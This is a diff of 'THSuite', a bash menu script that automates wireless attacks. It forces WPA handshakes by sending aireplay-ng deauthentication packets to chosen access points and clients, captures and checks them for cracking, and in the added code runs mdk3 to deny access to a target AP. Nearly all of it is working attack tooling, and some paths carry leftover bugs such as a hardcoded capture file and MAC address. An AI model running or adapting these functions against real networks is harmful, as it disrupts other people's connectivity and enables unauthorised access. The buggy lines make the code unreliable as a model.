@@ -2,7 +2,7 @@
 #THS Wireless Suite
 #thsuite.sh v0.1
 #By TAPE
-#Last edit 13-08-2013 01:30 
+#Last edit 13-08-2013 17:00 
 #Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
 #Tested on both with some options performing better on Kali
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
@@ -23,7 +23,7 @@ BLUN=$(echo -e "\e[0;36m")		#Alter fonts to blue normal
 ##
 ### VARIABLES
 #############
-THSDIR="/root/THS/TMP/"
+THSDIR="/root/THS_TMP/"
 SAVEDIR="/root/"
 if [ ! -e /root/THS_TMP/ ] ; then mkdir /root/THS_TMP/ ; fi
 #
@@ -40,6 +40,9 @@ if [ -e /root/THS_TMP/csvfile_cl.tmp ] ; then rm /root/THS_TMP/csvfile_cl.tmp ; 
 if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp* ; fi
 if [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp ; fi
 if [ -e /root/THS_TMP/ssid_list.tmp ] ; then rm /root/THS_TMP/ssid_list.tmp ; fi
+if [ -e /root/THS_TMP/trash.tmp ] ; then rm /root/THS_TMP/trash.tmp ; fi
+if [ -e "$THSDIR"blacklist.tmp ] ; then rm "$THSDIR"blacklist.tmp ; fi
+if [ -e "$THSDIR"whitelist.tmp ] ; then rm "$THSDIR"whitelist.tmp ; fi
 echo $STD""
 exit 0
 }
@@ -69,9 +72,8 @@ echo $STD"  By TAPE"
 echo $STD
 echo $STD"THSuite $GRN$VERS$STD Last edited $GRN$LED$STD
 
-Menu based script to simplify the standard wireless commands
-used when performing pre-cracking wireless reconnaissance.
-Written for the THS crew, Enjoy Guyz & Galz ;)" 
+Written for the THS crew at www.top-hat-sec.com
+Enjoy Guyz & Galz ;)" 
 f_exit
 }
 #
@@ -86,6 +88,9 @@ if [ -e /root/THS_TMP/csvfile_cl.tmp ] ; then rm /root/THS_TMP/csvfile_cl.tmp ; 
 if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp* ; fi
 if [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp ; fi
 if [ -e /root/THS_TMP/ssid_list.tmp ] ; then rm /root/THS_TMP/ssid_list.tmp ; fi
+if [ -e /root/THS_TMP/trash.tmp ] ; then rm /root/THS_TMP/trash.tmp ; fi
+if [ -e "$THSDIR"blacklist.tmp ] ; then rm "$THSDIR"blacklist.tmp ; fi
+if [ -e "$THSDIR"whitelist.tmp ] ; then rm "$THSDIR"whitelist.tmp ; fi
 } 
 #
 ##
@@ -110,8 +115,9 @@ else MONCHECK=1
 fi
 if [ $MONCHECK -eq 0 ] ; then 
 echo $RED">$STD No monitor interface detected"$STD
+sleep 0.5
 echo $RED">$STD Monitor interface required"$STD
-sleep 2.5
+sleep 1
 f_menu
 fi
 } 
@@ -218,7 +224,7 @@ echo $RED">$STD Interface selected already in monitor mode"
 sleep 2
 f_iface
 fi
-echo -ne $GRN">$STD Kill all processes that may limit performance? y/n $GRN"
+echo -ne $GRN">$STD Kill all processes that may limit performance? y/N $GRN"
 read CHECKKILL
 if [[ "$CHECKKILL" == "y" || "$CHECKKILL" == "Y" ]] ; then 
 xterm -geometry 96x15-0+0 -e airmon-ng check kill
@@ -292,7 +298,7 @@ echo $STD""
 echo $STD"Current country setting --> $GRN$COUN$STD"
 echo $STD"Country max TX power at --> $GRN$MPOW$STD"
 echo $STD""
-echo -ne $GRN">$STD Edit settings ? y/n $GRN"
+echo -ne $GRN">$STD Edit settings ? y/N $GRN"
 read EDITSET
 if [[ "$EDITSET" == "y" || "$EDITSET" == "Y" ]] ; then
 echo $STD""
@@ -464,8 +470,8 @@ echo $BLU">$STD Wireless scanning"
 echo $STD""
 echo $STD"Available interface(s)"
 f_exist
-f_iface_stat
 f_mon_check
+f_iface_stat
 echo $STD""
 #
 echo -ne $GRN">$STD Enter monitor interface to scan with: $GRN"
@@ -522,7 +528,7 @@ f_list_wireless() {
 clear
 f_header
 f_clean
-echo $BLU">$STD THSuite scans / captures"
+echo $BLU">$STD THSuite scans/captures"
 FILES=$(ls -A /root/THS_TMP/)
 if [ "$FILES" == "" ] ; then 
 echo -e $RED"\n >> No previous THSuite scans/captures found <<$STD"
@@ -532,7 +538,7 @@ fi
 echo $BLU"
 OPTIONS$STD
 1  View Access Points and clients/probes
-2  Check scans for WPA 4-way handshakes
+2  Check scans for useable handshakes
 3  Strip ESSIDs / Probes to wordlist
 4  Remove previous scans/captures
 Q  Back to main menu
@@ -579,24 +585,24 @@ f_parse_csv
 elif [ "$LISTW" == "2" ] ; then 
 clear
 f_header
-echo $BLU">$STD Check THSuite scans for 4-way handshakes"
+echo $BLU">$STD Check THSuite scans for handshakes"
 echo $STD""
 echo $STD"Found THSuite scans;$GRNN"
 ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed '/./=' | sed '/./N;s/\n/ /'
 echo $STD""
 MAXNR=$(ls -l /root/THS_TMP/*.csv | grep -v kismet.csv | wc -l)
-echo -ne $GRN">$STD Choose # from list to check scan for handshakes: $GRN"
+echo -ne $GRN">$STD Choose # from list to check associated capture for handshake(s): $GRN"
 read LISTNR
 if [ "$LISTNR" == "" ] ; then f_list_wireless ; fi
 	while [[ ! "$LISTNR" =~ ^[1-$MAXNR]$ ]] ; do
 	echo $RED">$STD Input error $RED[$STD$LISTNR$RED]$TD Entry not in list"
-	echo -ne $GRN">$STD Choose # from list to check scan for handshakes: $GRN"
+	echo -ne $GRN">$STD Choose # from list to check associated capture for handshake(s): $GRN"
 	read LISTNR
 	if [ "$LISTNR" == "" ] ; then f_list_wireless ; fi
 	done
 	CSVFILE=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed -n "$LISTNR p")
 	CAPFILE=$(echo $CSVFILE | sed 's/.csv/.cap/')
-echo $GRN">$STD Analyzing capture file $GRNN$CAPFILE$STD"
+HANDSHAKE=$CAPFILE
 pyrit -r "$CAPFILE" analyze  > /root/THS_TMP/pyrit_cap_analyze.tmp
 sed -i -e 's/^[ \t]*//' -e 's/ *$//' /root/THS_TMP/pyrit_cap_analyze.tmp
 
@@ -623,7 +629,7 @@ sleep 1.5
 f_list_wireless
 fi
 echo ""
-echo -n $STD"Strip handshakes to individual files ? y/n $GRN"
+echo -n $STD"Strip handshakes to individual files ? y/N $GRN"
 read STRIP
 if [[ "$STRIP" == "y" || "$STRIP" == "Y" ]] ; then
 f_strip
@@ -728,7 +734,7 @@ ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed '/./=' | sed '/./N;s/\n/ /'
 #
 echo $BLU"
 OPTIONS $STD
-1  Remove selected THSuite scans/captures
+1  Remove selected THSuite scan/capture
 2  Remove all THSuite scans/captures
 Q  Back to main menu
 "
@@ -737,7 +743,7 @@ read LISTF
 	if [ "$LISTF" == "q" ] || [ "$LISTF" == "Q" ] ; then 
 	echo $STD""
 	f_menu
-	elif [ "$LISTF" == "" ] ; then f_menu
+	elif [ "$LISTF" == "" ] ; then f_list_wireless
 	elif [[ "$LISTF" != [1-2] ]] ; then
 	echo $RED">$STD Input error $RED[$STD$LISTF$RED]$STD must be an entry from the above menu"$STD 
 	sleep 1
@@ -813,7 +819,7 @@ AUTH=$(echo $line | cut -d , -f 8 | sed -e 's/^ *//' -e 's/ *$//')
 printf '%-22s %-7s %-10s %-6s %-11s %-15s\n' "$AP" "$CHAN" "$ENC" "$AUTH" "$CIPH" "$ESSID"
 done <  /root/THS_TMP/csvfile_ap.tmp
 echo $STD""
-echo -ne $STD"View Clients / Probes in capture $GRNN$FILEIN$STD ? y/n $GRN"
+echo -ne $STD"View Clients / Probes in capture $GRNN$FILEIN$STD ? y/N $GRN"
 read CLIENTS
 if [[ "$CLIENTS" == "y" || "$CLIENTS" == "Y" ]] ; then 
 echo $BLUN"     BSSID                 CLIENT MAC           PROBE(s)"
@@ -848,7 +854,7 @@ f_force_wpa() {
 clear
 f_header
 f_clean
-echo $BLU">$STD Forcefully acquire WPA handshakes$STD"
+echo $BLU">$STD Forcefully acquire handshake(s)$STD"
 f_exist
 f_mon_check
 echo $BLU"
@@ -875,7 +881,7 @@ read FORCE_MENU
 if [ "$FORCE_MENU" == "1" ] ; then 
 clear
 f_header
-echo $BLU">$STD Manual input to acquire WPA handshake"
+echo $BLU">$STD Manual acquisition of handshake(s)"
 echo $STD
 echo $STD"Available interface(s);"
 f_iface_stat
@@ -900,7 +906,7 @@ echo -n $GRN">$STD Enter target AP BSSID: $GRN"
 read TARGET_AP
 if [ "$TARGET_AP" == "" ] ; then f_force_wpa ; fi
 while [[ ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]]
-do echo $RED">$STD Input error $RED[$STD$MACCH$RED]$STD Incorrect MAC syntax."
+do echo $RED">$STD Input error $RED[$STD$TARGET_AP$RED]$STD Incorrect MAC syntax."
 echo -n $GRN">$STD Enter target AP BSSID: $GRN"
 read TARGET_AP
 if [ "$TARGET_AP" == "" ] ; then f_force_wpa ; fi
@@ -974,19 +980,19 @@ NAME=$(echo $TARGET_AP | sed 's/:/-/g')
 FILENAME="TEMP-$NAME"
 #
 sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 $DEAUTHS -a $TARGET_AP -c $TARGET_CL \
-& timeout $SCANTIME xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
+& timeout $SCANTIME xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap csv -w $SAVEDIR$FILENAME
 #Rename and move capture file 
 HS_NAME=$(echo $TARGET_AP | sed 's/:/-/g')
 mv $SAVEDIR"$FILENAME"* $SAVEDIR"$HS_NAME".cap
 HANDSHAKE=$SAVEDIR"$HS_NAME".cap
-xterm -e SSID_PARSE=$(tshark -n -R wlan -r $HANDSHAKE | grep SSID | grep $TARGET_AP | sed -n '$p')
-xterm -e TARGET_SSID=$(echo $SSID_PARSE | sed '$p' | sed 's/^.*SSID=//') 
-echo $TARGET_SSID
 #
 echo $STD
 echo -n $GRN">$STD Check $HANDSHAKE for handshakes? y/N $GRN"
 read CHECK
-if [[ "$CHECK" == "y" || "$CHECK" == "Y" ]] ; then f_handshake_check
+if [[ "$CHECK" == "y" || "$CHECK" == "Y" ]] ; then
+echo $GRN">$STD Stripping network SSID from capture with tshark"$STD 
+TARGET_SSID=$(tshark -n -R wlan -r 8c-04-ff-7b-73-7b.cap | grep SSID | grep 8c:04:ff:7b:73:7b | sed -n '$p' | sed 's/^.*SSID=//')
+f_handshake_check
 else
 f_exit
 fi
@@ -998,7 +1004,7 @@ fi
 elif [ "$FORCE_MENU" == "2" ] ; then 
 clear
 f_header
-echo $BLU">$STD Assisted acquisition of WPA handshake"
+echo $BLU">$STD Assisted acquisition of handshake(s)"
 echo $STD
 echo $STD"Available interface(s);"
 f_iface_stat
@@ -1042,14 +1048,17 @@ read SCAN
 if [[ "$CHAN" != "" && "$SCAN" != "" ]] ; then
 timeout $SCAN xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -c $CHAN -w /root/THS_TMP/wpa_temp
 elif [[ "$CHAN" != "" && "$SCAN" == "" ]] ; then
+echo $GRN">$STD Ctrl C to stop scan"
 xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -c $CHAN -w /root/THS_TMP/wpa_temp
 elif [[ "$CHAN" == "" && "$SCAN" == "" && "$HOP" == "" ]] ; then
+echo $GRN">$STD Ctrl C to stop scan"
 xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -w /root/THS_TMP/wpa_temp
 elif [[ "$CHAN" == "" && "$SCAN" != "" && "$HOP" == "" ]] ; then
 timeout $SCAN xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -w /root/THS_TMP/wpa_temp
 elif [[ "$CHAN" == "" && "$SCAN" != "" && "$HOP" != "" ]] ; then
 timeout $SCAN xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -f $HOP -w /root/THS_TMP/wpa_temp
 elif [[ "$CHAN" == "" && "$SCAN" == "" && "$HOP" != "" ]] ; then
+echo $GRN">$STD Ctrl C to stop scan"
 xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -f $HOP -w /root/THS_TMP/wpa_temp
 fi
 echo $STD
@@ -1059,7 +1068,7 @@ sleep 1
 #
 clear
 f_header
-echo $BLU">$STD Assisted acquisition of WPA handshake"
+echo $BLU">$STD Assisted acquisition of handshake(s)"
 echo $STD
 echo $GRN">$STD Parsing scan results.."
 CSVFILE="/root/THS_TMP/wpa_temp-01.csv"
@@ -1077,16 +1086,16 @@ MAXNR=$(cat /root/THS_TMP/scan_assist.tmp | wc -l)
 echo $STD
 #
 #
-echo -ne $GRN">$STD Choose network # from list to attempt forcing a handshake: $GRN"
+echo -ne $GRN">$STD Choose # from list to attempt forcing a handshake: $GRN"
 read LISTNR
 if [ "$LISTNR" == "" ] ; then f_force_wpa ; fi
 	while [[ ! "$LISTNR" =~ [1-$MAXNR] ]] ; do
 	if [ "$LISTNR" == "" ] ; then f_force_wpa ; fi
 	echo $RED">$STD Input error $RED[$STD$LISTNR$RED]$STD Entry not in list"
-	echo -ne $GRN">$STD Choose network # from list to attempt forcing a handshake: $GRN"
+	echo -ne $GRN">$STD Choose # from list to attempt forcing a handshake: $GRN"
 	read LISTNR
 	done
-echo -n $GRN">$STD Use same interface to send deauth packets? Y/n "$GRN
+echo -n $GRN">$STD Use same interface $GRN[$STD$IFACE$GRN]$STD to send deauth packets? Y/n "$GRN
 read SEND
 if [[ "$SEND" == "n" || "$SEND" == "N" ]] ; then
 #Using different interfaces for scanning and deauthing
@@ -1241,21 +1250,20 @@ f_exit
 #
 # This function makes use of the tool 'mdk3'
 f_wireless_disruption() {
+f_clean
 clear
 f_header
 echo $BLU">$STD Wireless disruption"
 echo $STD""
 echo $RED"  WARNING! These functions can wreak havoc on wireless networks"
 echo $RED"          Use with care on authorized networks only"
-sleep 3
-f_exist
-f_mon_check
+#sleep 3
 echo $BLU"
 OPTIONS $STD
-1  Kick all clients from specified AP
-2  Only allow specified MACs to AP
-3  Deny access to all APs indiscriminately
-4  ?  ;)
+1  Deny access to specified AP
+2  Deny access to all found APs
+3  Attempt authentication DoS on AP
+4  Flood airwaves with fake AP beacons
 Q  Back to main menu
 "
 echo -ne "Enter choice from above menu: "$GRN
@@ -1269,13 +1277,92 @@ read DISR_MENU
 	sleep 1
 	f_wireless_disruption
 	fi
-read DISR_MENU
-echo "Work in progress"
-echo "Available interfaces"
-echo "Choose monitor interface to use"
-echo "Enter AP to harrass"
-read
+echo $STD"Available interface(s);"
+f_exist
+f_mon_check
+f_iface_stat
+#Setting interface
+echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
+read IFACE
+if [ "$IFACE" == "" ] ; then f_menu ; fi
+while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
+echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
+echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
+read IFACE
+if [ "$IFACE" == "" ] ; then f_menu ; fi
+done
+if [[ ! "$IFACE" =~ "mon" ]] ; then
+	echo $RED"> [$STD$IFACE$RED]$STD is not a monitor interface"
+	sleep 1.5
+	f_wireless_disruption
+fi 
+#Go-to functions 
+if [ "$DISR_MENU" == "1" ] ; then
+f_ap_access_deny
+elif [ "$DISR_MENU" == "2" ] ; then
+f_deny_all
+elif [ "$DISR_MENU" == "3" ] ; then
+echo "Authentication DoS mdk3 a"
+elif [ "$DISR_MENU" == "4" ] ; then
+echo "Fake AP beacon flood mdk3 b" 
+fi
 f_exit
+}
+#
+##
+### DENY ACCESS TO AP
+#####################
+f_ap_access_deny() {
+#Setting target AP
+echo -n $GRN">$STD Enter target AP BSSID: $GRN"
+read TARGET_AP
+if [ "$TARGET_AP" == "" ] ; then f_menu ; fi
+while [[ ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]]
+do echo $RED">$STD Input error $RED[$STD$TARGET_AP$RED]$STD Incorrect MAC syntax."
+echo -n $GRN">$STD Enter target AP BSSID: $GRN"
+read TARGET_AP
+if [ "$TARGET_AP" == "" ] ; then f_menu ; fi
+done
+	if [[ "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ ]] ; then
+	TARGET_AP=$(echo "$TARGET_AP" | sed 's/-/:/g')
+	fi
+echo "$TARGET_AP" > "$THSDIR"blacklist.tmp
+#Setting target channel
+echo -n $GRN">$STD Enter channel of target AP: $GRN"
+read TARGET_CHAN
+if [ "$TARGET_CHAN" == "" ] ; then f_wireless_disruption ; fi
+while [ ! `expr $TARGET_CHAN + 1 2> /dev/null` ] || (($TARGET_CHAN>14)) ; do
+if [ "$TARGET_CHAN" == "" ] ; then f_wireless_disruption ; fi
+echo $RED">$STD Input error $RED[$STD$TARGET_CHAN$RED]$STD Enter target's channel number."
+echo -n $GRN">$STD Enter channel of target AP: $GRN"
+read TARGET_CHAN
+done
+# Setting attack duration
+echo -n $GRN">$STD Enter attack duration(seconds): $GRN" 
+read ATTACKTIME
+if [ "$ATTACKTIME" == "" ] ; then ATTACKTIME=15 ; fi
+while [ ! `expr $ATTACKTIME + 1 2> /dev/null` ] && [ "$ATTACKTIME" != "" ] ; do
+echo $RED">$STD Input error $RED[$STD$ATTACKTIME$RED]$STD Only numeric values possible."
+echo -n $GRN">$STD Enter attack duration(seconds): $GRN"
+read SCANTIME
+if [ "$ATTACKTIME" == "" ] ; then SCANTIME=15 ; fi
+done
+#Creating blacklist file
+echo $GRN">$STD Denying access to $GRN$TARGET_AP$STD.." 
+timeout $ATTACKTIME xterm -T "THSuite - Deny access to $TARGET_AP" -geometry 105x20-0-0 -e mdk3 $IFACE d -b "$THSDIR"blacklist.tmp -c $TARGET_CHAN
+echo $GRN">$STD Attack stopped" 
+#
+f_exit
+}
+#
+##
+### DENY ACCESS TO ALL APs
+##########################
+f_deny_all() {
+echo $RED"WORK IN PROGRESS"
+echo $RED">$STD Exiting to main menu"
+sleep 1.5
+f_menu
 }
 #
 ##
@@ -1303,7 +1390,7 @@ echo $GRN">$STD Checking if latest version in use.."
 if [[ "$VERS" != "$NEW_VERS" || "$LED" != "$NEW_LED" ]] ; then
 echo $RED">$STD Version in use is $RED$VERS$STD last edited on $LED"
 echo $GRN">$STD Latest version is $GRN$NEW_VERS$STD last edited on $NEW_LED"
-echo -n $GRN">$STD Update to latest ? y/n "$GRN
+echo -n $GRN">$STD Update to latest ? y/N "$GRN
 read UPD1
 	if [[ "$UPD1" == "y" || "$UPD1" == "Y" ]] ; then 
 		echo $GRN">$STD Downloading latest version.."
@@ -1323,6 +1410,25 @@ read UPD1
 	sleep 1
 	f_exit
 	fi
+f_exit
+}
+#
+##
+### HELP INFORMATION
+####################
+f_help() {
+clear
+f_header
+echo $STD"  By TAPE          thsuite $VERS"
+echo $STD"
+Menu based script to simplify the standard commands used
+when performing wireless auditing/reconnaissance.
+
+WIKI on THSuite can be found at:
+www.code.google.com/p/thsuite/w/list"
+echo $STD"
+Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
+Tested on both with some options performing better on Kali"
 f_exit
 }
 #
@@ -1361,6 +1467,7 @@ case $menu in
 4) f_list_wireless ;;
 5) f_force_wpa ;;
 6) f_wireless_disruption ;;
+h) f_help ;;
 u) f_update ;;
 q) f_exit ;; 
 Q) f_exit ;;
@@ -1385,10 +1492,11 @@ f_menu
 ##
 ### TO DO
 ######### 
-# - Fix TARGET_SSID reading on manual WPA acquiring function.
-# - Fix correct listing of networks with handshakes (4-2)
+# - Include test to see whether network in range of adapter's sending range (mdk3 p)
+# - Improve listing of networks with handshakes (4-2)
 # - Convert cap to hccap 
 # - Optimise code with functions to reduce size / improve performane
 # - Include option to alter save directory
 # - Write general help file / help file for each menu item
+# - Improve checking of monitor mode to allow names other than mon*
 
